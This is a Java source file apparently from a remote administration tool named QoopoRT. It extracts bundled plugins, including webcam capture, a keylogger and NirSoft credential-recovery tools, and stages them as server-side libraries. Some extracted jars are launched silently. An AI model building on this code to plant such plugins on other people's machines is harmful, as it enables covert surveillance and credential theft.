/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package qooport;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import plugin.Plugin;
import qooport.modulos.archivos.Transferencias;
import qooport.utilidades.Util;

/**
 *
 * @author aigarcia
 */
public class Global {

    public static List<Plugin> plugins;
    public static Transferencias transferencias = new Transferencias();
    private static final boolean CARGAR_PLUGIN = false;
//    public static String[] nombresLibs = new String[]{"JMapViewer", "weupnp-0.1.1", "JTattoo-1.6.11", "QoopoRTServer","QoopoRTCrypter"};
//    public static String[] nombresLibs = new String[]{"JMapViewer", "weupnp-0.1.1", "JTattoo-1.6.11", "QoopoRTServer"};
    public static String[] nombresLibs = new String[]{"JMapViewer", "weupnp-0.1.4", "JTattoo-1.6.11", "QoopoRTServer"};

    public static void cargarPlugins() {
        try {
            Global.extraerLibsDelServer();
        } catch (Exception e) {
        }
        plugins = new ArrayList<Plugin>();
        for (int i = 1; i <= 100; i++) {
            Plugin tmp;
            try {
                //System.out.println("intentando cargar p" + i);
                tmp = ((Plugin) Class.forName("plugin.p" + i + ".PluginDef").newInstance());
            } catch (Exception ex) {
                tmp = null;
            }
            if (tmp != null) {
                //lista.add(tmp);
                plugins.add(new Plugin(tmp.getId(), tmp.getNombre(), tmp.getVersion(), tmp.getDescripcion(), tmp.getPlataformas(), tmp.getListaArchivo()));
            }
        }
    }

    public static void cargarPlugin() {
        if (!CARGAR_PLUGIN) {
            return;
        }
        try {
            File carpeta = new File("lib");
            try {
                carpeta.mkdir();
            } catch (Exception e) {
            }
            File p1 = new File(carpeta, "plugin.jar");
            InputStream inputWC = Global.class.getResourceAsStream("/extras/lib/plugin.jar");
            if (p1.exists()) {
                p1.delete();
            }
            Util.copyFile(inputWC, p1);
            try {
                final String javaBin = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";
                final ArrayList<String> command = new ArrayList<>();
                command.add(javaBin);
                command.add("-jar");
                command.add(p1.getPath());
                final ProcessBuilder builder = new ProcessBuilder(command);
                builder.start();
            } catch (IOException ex) {
            }
        } catch (IOException ex) {
        }
    }

    public static void extraerGeoIp() {
        try {
            File carpeta = new File("lib");
            try {
                carpeta.mkdir();
            } catch (Exception e) {
            }
            //GeoLiteCity.dat
            //GeoIP.dat
            File p1 = new File(carpeta, "GeoLiteCity.dat");
            InputStream inputWC = Global.class.getResourceAsStream("/extras/GeoLiteCity.dat");
            if (p1.exists()) {
                p1.delete();
            }
            Util.copyFile(inputWC, p1);
            try {
                final String javaBin = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";
                final ArrayList<String> command = new ArrayList<>();
                command.add(javaBin);
                command.add("-jar");
                command.add(p1.getPath());
                final ProcessBuilder builder = new ProcessBuilder(command);
                builder.start();
            } catch (IOException ex) {
            }
        } catch (Exception ex) {
//            ponerEstado("Error al extraer GeoLiteCity.dat");
        }
    }

    public static void extraerLibs() {
        File carpeta = new File("lib");
        try {
            carpeta.mkdir();
        } catch (Exception e) {
        }
        for (String plugin : nombresLibs) {
            try {
                File p = new File(carpeta, plugin + ".jar");
                InputStream recurso = Global.class.getResourceAsStream("/extras/lib/" + plugin + ".jar");
                if (!p.exists()) {
                    Util.copyFile(recurso, p);
                }
            } catch (Exception ex) {
            }
        }
    }

    /**
     * Estra las librerias que necesita el server para funcionar (plugins)
     */
    public static void extraerLibsDelServer() {
        try {
            File carpetaLib = new File("lib/lib");
            try {
                carpetaLib.mkdir();
            } catch (Exception e) {
            }
            File carpetaLib2 = new File("lib/lib/lib");
            try {
                carpetaLib2.mkdir();
            } catch (Exception e) {
            }
            //------------------------------------------------------------------------
            //-----------           WEB CAM
            //------------------------------------------------------------------------
            File p1 = new File(carpetaLib, "QoopoRTPlugWC.jar");
            File p3 = new File(carpetaLib2, "bridj-0.7-20130703.103049-42.jar");
            //AGREGO LA LIBRERIA DEL WEBCAM
            InputStream inputWC = Global.class.getResourceAsStream("/extras/plugins/p2/QoopoRTPlugWC.jar");
            //librerias dependientes del webcam
            InputStream inputWC3 = Global.class.getResourceAsStream("/extras/plugins/p2/bridj-0.7-20130703.103049-42.jar");
            if (p1.exists()) {
                p1.delete();
            }
            if (p3.exists()) {
                p3.delete();
            }
            Util.copyFile(inputWC, p1);
            Util.copyFile(inputWC3, p3);

            //------------------------------------------------------------------------
            //--                JNA
            //------------------------------------------------------------------------
            File jna_1 = new File(carpetaLib, "QoopoRTPlugJNA.jar");
            File jna_2 = new File(carpetaLib2, "jna-4.2.1.jar");
            File jna_3 = new File(carpetaLib2, "jna-platform-4.2.1.jar");

            InputStream input_jna_1 = Global.class.getResourceAsStream("/extras/plugins/p3/QoopoRTPlugJNA.jar");
            //librerias dependientes del jna
            InputStream input_jna_2 = Global.class.getResourceAsStream("/extras/plugins/p3/jna-4.2.1.jar");
            InputStream input_jna_3 = Global.class.getResourceAsStream("/extras/plugins/p3/jna-platform-4.2.1.jar");
            if (jna_1.exists()) {
                jna_1.delete();
            }
            if (jna_2.exists()) {
                jna_2.delete();
            }
            if (jna_3.exists()) {
                jna_3.delete();
            }
            Util.copyFile(input_jna_1, jna_1);
            Util.copyFile(input_jna_2, jna_2);
            Util.copyFile(input_jna_3, jna_3);

            //------------------------------------------------------------------------
            //--                NIRSOFT
            //------------------------------------------------------------------------
            File nir_1 = new File(carpetaLib, "QoopoRTPlugNirsoft.jar");

            InputStream input_nir_1 = Global.class.getResourceAsStream("/extras/plugins/p4/QoopoRTPlugNirsoft.jar");

            if (nir_1.exists()) {
                nir_1.delete();
            }

            Util.copyFile(input_nir_1, nir_1);

            //------------------------------------------------------------------------
            //--                KeyLogger
            //------------------------------------------------------------------------
            File keylo = new File(carpetaLib, "QoopoRTPlugKL.jar");

            InputStream input_kl = Global.class.getResourceAsStream("/extras/plugins/p1/QoopoRTPlugKL.jar");

            if (keylo.exists()) {
                keylo.delete();
            }
            Util.copyFile(input_kl, keylo);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // <editor-fold defaultstate="collapsed" desc="Cargar plugins y extras">
    public static void extraerPlugInsWebCam() throws IOException {
        File carpeta = new File("tmp");
        try {
            carpeta.mkdir();
        } catch (Exception e) {
        }
        File p1 = new File(carpeta, "QoopoRTPlugWC.jar");
//        File p2 = new File(carpeta, "slf4j-api-1.7.2.jar");
        File p3 = new File(carpeta, "bridj-0.7-20130703.103049-42.jar");
        //AGREGO LA LIBRERIA DEL WEBCAM
        InputStream inputWC = Global.class.getResourceAsStream("/extras/plugins/p2/QoopoRTPlugWC.jar");
        //librerias dependientes del webcam
        InputStream inputWC3 = Global.class.getResourceAsStream("/extras/plugins/p2/bridj-0.7-20130703.103049-42.jar");
        if (p1.exists()) {
            p1.delete();
        }
//        if (p2.exists()) {
//            p2.delete();
//        }
        if (p3.exists()) {
            p3.delete();
        }
//        Util.copyFile(inputWC2, p2);
        Util.copyFile(inputWC, p1);
        Util.copyFile(inputWC3, p3);
    }

    public static void extraerPlugInsJNA() throws IOException {
        File carpeta = new File("tmp");
        try {
            carpeta.mkdir();
        } catch (Exception e) {
        }
        File p1 = new File(carpeta, "QoopoRTPlugJNA.jar");
        File p2 = new File(carpeta, "jna-4.2.1.jar");
        File p3 = new File(carpeta, "jna-platform-4.2.1.jar");

        InputStream inputWC = Global.class.getResourceAsStream("/extras/plugins/p3/QoopoRTPlugJNA.jar");
        //librerias dependientes del jna
        InputStream inputWC2 = Global.class.getResourceAsStream("/extras/plugins/p3/jna-4.2.1.jar");
        InputStream inputWC3 = Global.class.getResourceAsStream("/extras/plugins/p3/jna-platform-4.2.1.jar");
        if (p1.exists()) {
            p1.delete();
        }
        if (p2.exists()) {
            p2.delete();
        }
        if (p3.exists()) {
            p3.delete();
        }
        Util.copyFile(inputWC, p1);
        Util.copyFile(inputWC2, p2);
        Util.copyFile(inputWC3, p3);
    }

    public static void extraerPlugInsKL() throws IOException {
        File carpeta = new File("tmp");
        try {
            carpeta.mkdir();
        } catch (Exception e) {
        }
        File p1 = new File(carpeta, "QoopoRTPlugKL.jar");
        //AGREGO LA LIBRERIA DEL WEBCAM
        InputStream inputWC = Global.class.getResourceAsStream("/extras/plugins/p1/QoopoRTPlugKL.jar");
        if (p1.exists()) {
            p1.delete();
        }
        Util.copyFile(inputWC, p1);
    }

    public static void extrarPlugInsNirSoft() throws IOException {
        File carpeta = new File("tmp");
        try {
            carpeta.mkdir();
        } catch (Exception e) {
        }
        File p1 = new File(carpeta, "QoopoRTPlugNirsoft.jar");
        //AGREGO LA LIBRERIA DEL WEBCAM
        InputStream inputWC = Global.class.getResourceAsStream("/extras/plugins/p4/QoopoRTPlugNirsoft.jar");
        if (p1.exists()) {
            p1.delete();
        }
        Util.copyFile(inputWC, p1);
    }

    public static void extrarPlugin(Plugin plugin) throws IOException {
        File carpeta = new File("plugins");
        try {
            carpeta.mkdirs();
        } catch (Exception e) {
        }
        if (plugin.getListaArchivo() != null && !plugin.getListaArchivo().isEmpty()) {
            System.out.println("Cargando plugin " + plugin.getNombre());
            for (String cadena : plugin.getListaArchivo()) {

                System.out.println("------------------------------------------");
                System.out.println("cadena =" + cadena);
                String[] partes = cadena.split("&&");
                File carpeta2 = new File(carpeta, "p" + plugin.getId());
                carpeta2.mkdirs();
                File p1 = new File(carpeta2, partes[0]);
                System.out.println("archivo:" + partes[0]);
                System.out.println("recurso a buscar es ");
                System.out.println("/extras/plugins/p" + plugin.getId() + "/" + partes[0]);
                InputStream inputWC = Global.class.getResourceAsStream("/extras/plugins/p" + plugin.getId() + "/" + partes[0]);
                if (p1.exists()) {
                    p1.delete();
                }
                if (inputWC != null) {
                    Util.copyFile(inputWC, p1);
                } else {
                    System.out.println("Es nulo el inputstream");
                }
            }
        } else {
            System.out.println("No hay archivos en el plugin");
        }

    }

//    public static void extrarPlugInsNirSoft() throws IOException {
//        File carpeta = new File("tmp");
//        try {
//            carpeta.mkdir();
//        } catch (Exception e) {
//        }
//        for (String plugin : nombresPluginsNirsoft) {
//            File p = new File(carpeta, plugin + ".exe");
//            InputStream recurso = Global.class.getResourceAsStream("/extras/plugins/nirsoft/" + plugin + ".rpl");
//            if (p.exists()) {
//                p.delete();
//            }
//            Util.copyFile(recurso, p);
//        }
//    }
}
